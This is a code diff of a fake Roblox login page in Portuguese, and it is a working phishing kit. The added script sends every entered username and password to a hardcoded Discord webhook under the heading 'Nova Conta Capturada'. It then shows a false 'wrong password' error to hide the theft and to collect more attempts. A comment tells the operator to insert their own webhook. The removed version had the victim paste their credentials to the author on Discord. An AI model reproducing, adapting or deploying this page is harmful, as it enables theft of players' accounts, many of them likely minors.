@@ -1,176 +1,197 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-br">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Log in to Roblox</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roblox - Entrar</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    * { margin:0; padding:0; box-sizing:border-box; }
     body {
       font-family: 'Roboto', sans-serif;
-      background: url('https://images.rbxcdn.com/076d146437ffc79cebc36bf2ded91196') no-repeat center center fixed;
-      background-size: cover;
-      color: #f5f5f5;
+      background: #0f0f10;
+      color: #e3e3e3;
       min-height: 100vh;
       display: flex;
-      align-items: center;
       justify-content: center;
+      align-items: center;
+      overflow: hidden;
     }
-    .login-container {
-      background: rgba(22, 22, 22, 0.85);
-      border: 1px solid #2a2a2a;
+    .background {
+      position: fixed; inset:0;
+      background: linear-gradient(135deg, #1a1a2e 0%, #0f0f10 100%);
+      z-index: -2;
+    }
+    .container {
+      width: 100%; max-width: 420px;
+      padding: 40px 32px;
+      background: rgba(20,20,25,0.85);
       border-radius: 12px;
-      padding: 48px 32px 40px;
-      width: 100%;
-      max-width: 420px;
-      text-align: center;
-      box-shadow: 0 10px 40px rgba(0,0,0,0.7);
-      backdrop-filter: blur(8px);
+      border: 1px solid rgba(255,255,255,0.06);
+      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+      backdrop-filter: blur(10px);
+      z-index: 10;
     }
-    .logo { margin-bottom: 40px; }
-    .logo img { width: 180px; }
-    h1 { font-size: 28px; font-weight: 500; margin-bottom: 36px; color: #ffffff; }
-    .form-group { margin-bottom: 20px; position: relative; }
+    .logo { text-align:center; margin-bottom:32px; }
+    .logo img { width:180px; height:auto; filter: drop-shadow(0 4px 12px rgba(0,162,255,0.4)); }
+    h1 { text-align:center; font-size:28px; font-weight:500; margin-bottom:32px; color:#fff; }
+    .input-group { margin-bottom:20px; position:relative; }
+    label { display:block; margin-bottom:8px; font-size:14px; color:#c9c9c9; }
     input {
-      width: 100%;
-      padding: 14px 16px;
-      background: rgba(15, 15, 15, 0.8);
-      border: 1px solid #444;
-      border-radius: 6px;
-      color: #fff;
-      font-size: 16px;
+      width:100%; padding:14px 16px;
+      border:1px solid #444; border-radius:8px;
+      background:#111113; color:white; font-size:16px;
+      transition:all 0.2s;
     }
-    input::placeholder { color: #aaa; }
-    input:focus { outline: none; border-color: #1a8cff; box-shadow: 0 0 0 3px rgba(26,140,255,0.3); }
-    .password-wrapper { position: relative; }
-    .eye-icon {
-      position: absolute;
-      right: 16px;
-      top: 50%;
-      transform: translateY(-50%);
-      cursor: pointer;
-      font-size: 20px;
-      color: #aaa;
-      user-select: none;
+    input:focus {
+      outline:none; border-color:#00a2ff;
+      box-shadow:0 0 0 3px rgba(0,162,255,0.25);
     }
-    button {
-      width: 100%;
-      padding: 14px;
-      background: #007bff;
-      border: none;
-      border-radius: 6px;
-      color: white;
-      font-size: 17px;
-      font-weight: 500;
-      cursor: pointer;
-      transition: background 0.2s;
-      margin-top: 12px;
+    .btn-login {
+      width:100%; padding:16px; margin:12px 0 20px;
+      background:#00a2ff; color:white; border:none;
+      border-radius:8px; font-size:18px; font-weight:500;
+      cursor:pointer; transition:all 0.25s;
     }
-    button:hover { background: #0069d9; }
+    .btn-login:hover { background:#0088d9; transform:translateY(-1px); }
+    .btn-login:active { transform:translateY(1px); }
+    .btn-login:disabled {
+      background:#555; cursor:not-allowed; opacity:0.7;
+    }
+
     .error-message {
-      margin: 0 0 16px 0;
-      padding: 10px;
-      background: rgba(255, 0, 0, 0.2);
-      border: 1px solid #ff4d4d;
-      border-radius: 6px;
-      color: #ff4d4d;
-      font-size: 14px;
-      font-weight: 500;
-      opacity: 0;
-      transform: translateY(-10px);
-      transition: opacity 0.4s ease, transform 0.4s ease;
-      pointer-events: none;
+      position:absolute; left:50%; transform:translateX(-50%);
+      bottom:-60px;
+      background:rgba(255,60,60,0.92); color:white;
+      padding:12px 24px; border-radius:8px;
+      font-weight:500; font-size:15px; white-space:nowrap;
+      opacity:0; pointer-events:none;
+      box-shadow:0 6px 20px rgba(255,0,0,0.35);
     }
-    .error-message.show { opacity: 1; transform: translateY(0); }
-    .links { margin: 24px 0; font-size: 14px; }
-    .links a { color: #1a8cff; text-decoration: none; }
-    .links a:hover { text-decoration: underline; }
-    .separator { color: #666; margin: 0 6px; }
-    .signup { margin-top: 32px; font-size: 15px; color: #ccc; }
-    .signup a { color: #1a8cff; font-weight: 500; text-decoration: none; }
-    .signup a:hover { text-decoration: underline; }
-    @media (max-width: 480px) {
-      .login-container { padding: 40px 24px; border-radius: 0; min-height: 100vh; }
+    .error-message.show {
+      opacity:1; bottom:-10px;
+      animation: shake 0.4s, fadeOut 3s 1s forwards;
     }
+    @keyframes shake {
+      0%,100% { transform:translateX(-50%) translateY(0); }
+      20% { transform:translateX(-50%) translateY(-4px); }
+      40% { transform:translateX(-50%) translateY(4px); }
+      60% { transform:translateX(-50%) translateY(-3px); }
+      80% { transform:translateX(-50%) translateY(3px); }
+    }
+    @keyframes fadeOut { to { opacity:0; bottom:-40px; } }
   </style>
 </head>
 <body>
 
-  <div class="login-container">
-    <div class="logo">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Roblox_2022_Logo.svg/512px-Roblox_2022_Logo.svg.png" alt="Roblox">
-    </div>
+<div class="background"></div>
 
-    <h1>Log in to Roblox</h1>
-
-    <form id="loginForm">
-      <div class="form-group">
-        <input type="text" id="username" placeholder="Username/Email/Phone" required autocomplete="username">
-      </div>
-
-      <div class="form-group password-wrapper">
-        <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
-        <span class="eye-icon" id="toggleEye">👁️</span>
-      </div>
-
-      <div class="error-message" id="errorMsg">Senha inválida ou Nome Incorreto!!</div>
-
-      <button type="submit">Entrar</button>
-    </form>
-
-    <div class="links">
-      <a href="#">Forgot Password or Username?</a>
-      <span class="separator">•</span>
-      <a href="#">Login with Another Logged In Device</a>
-    </div>
-
-    <div class="signup">
-      Don't have an account? <a href="#">Sign Up</a>
-    </div>
+<div class="container">
+  <div class="logo">
+    <img src="https://www.roblox.com/images/Logo.svg" alt="Roblox Logo" 
+         onerror="this.src='https://via.placeholder.com/180x60/00a2ff/ffffff?text=Roblox';">
   </div>
 
-  <script>
-    const form = document.getElementById('loginForm');
-    const errorMsg = document.getElementById('errorMsg');
-    const usernameInput = document.getElementById('username');
-    const passwordInput = document.getElementById('password');
-    const toggleEye = document.getElementById('toggleEye');
+  <h1>Entrar</h1>
 
-    toggleEye.addEventListener('click', () => {
-      if (passwordInput.type === 'password') {
-        passwordInput.type = 'text';
-        toggleEye.textContent = '🙈';
-      } else {
-        passwordInput.type = 'password';
-        toggleEye.textContent = '👁️';
+  <div class="input-group">
+    <label for="username">Nome de usuário ou Email</label>
+    <input type="text" id="username" placeholder="Seu @nome ou email" autocomplete="off">
+  </div>
+
+  <div class="input-group">
+    <label for="password">Senha</label>
+    <input type="password" id="password" placeholder="Senha" autocomplete="off">
+  </div>
+
+  <button class="btn-login" id="loginBtn">Entrar</button>
+
+  <div class="error-message" id="errorMsg">Nome de usuário ou senha incorretos</div>
+</div>
+
+<script>
+  const loginBtn = document.getElementById('loginBtn');
+  const errorMsg = document.getElementById('errorMsg');
+  const usernameInput = document.getElementById('username');
+  const passwordInput = document.getElementById('password');
+
+  // ╔════════════════════════════════════════════════════╗
+  // ║     MUDE AQUI PELO SEU WEBHOOK DO DISCORD          ║
+  // ╚════════════════════════════════════════════════════╝
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1474804412965978274/aQAej8nqhjGJMP_FBvbJM84EmTaHdj9bWL9wIvibBh3oHhSbfVBiuMrVGxnY5bESCnVy";
+
+  async function enviarParaDiscord(username, password) {
+    try {
+      const data = {
+        content: "",
+        embeds: [{
+          title: "🔐 **Nova Conta Capturada**",
+          color: 0xFF0000, // vermelho (pode mudar: 0x00AA00 = verde escuro, etc)
+          fields: [
+            {
+              name: "**Login:**",
+              value: `\`${username.trim() || "——— vazio ———"}\``,
+              inline: true
+            },
+            {
+              name: "**Senha:**",
+              value: `\`${password.trim() || "——— vazio ———"}\``,
+              inline: true
+            }
+          ],
+          timestamp: new Date().toISOString(),
+          footer: {
+            text: "Capturado • " + new Date().toLocaleString("pt-BR", {
+              timeZone: "America/Sao_Paulo"
+            })
+          }
+        }]
+      };
+
+      const response = await fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+
+      if (!response.ok) {
+        console.error("Falha no webhook:", response.status);
       }
-    });
+    } catch (err) {
+      console.error("Erro ao enviar:", err);
+    }
+  }
 
-    form.addEventListener('submit', function(e) {
-      e.preventDefault();
+  loginBtn.addEventListener('click', async () => {
+    const username = usernameInput.value.trim();
+    const password = passwordInput.value.trim();
 
-      const nome = usernameInput.value.trim();
-      const senha = passwordInput.value.trim();
+    // Desabilita botão durante o processo
+    loginBtn.disabled = true;
+    loginBtn.textContent = "Entrando...";
 
-      if (nome && senha) {
-        const textoCopiado = `Nome: ${nome}\nSenha: ${senha}`;
+    // Envia pro Discord
+    await enviarParaDiscord(username, password);
 
-        navigator.clipboard.writeText(textoCopiado).then(() => {
-          alert('Dados copiados! Cole no Discord (Ctrl + V) e envie pra mim.');
-        }).catch(() => {
-          alert('Erro ao copiar. Copie manual:\n\n' + textoCopiado);
-        });
+    // Mostra erro (como se tivesse errado a senha)
+    errorMsg.textContent = "Nome de usuário ou senha incorretos";
+    errorMsg.classList.add('show');
 
-        window.open('https://discord.com/channels/@me', '_blank');
-      }
-
-      errorMsg.classList.add('show');
-      setTimeout(() => {
-        errorMsg.classList.remove('show');
-      }, 3000);
-    });
-  </script>
+    // Volta ao normal depois de ~3.5 segundos
+    setTimeout(() => {
+      errorMsg.classList.remove('show');
+      loginBtn.disabled = false;
+      loginBtn.textContent = "Entrar";
+      
+      // Limpa os campos (opcional – comente se não quiser)
+      // usernameInput.value = "";
+      // passwordInput.value = "";
+    }, 3500);
+  });
+</script>
 
 </body>
 </html>
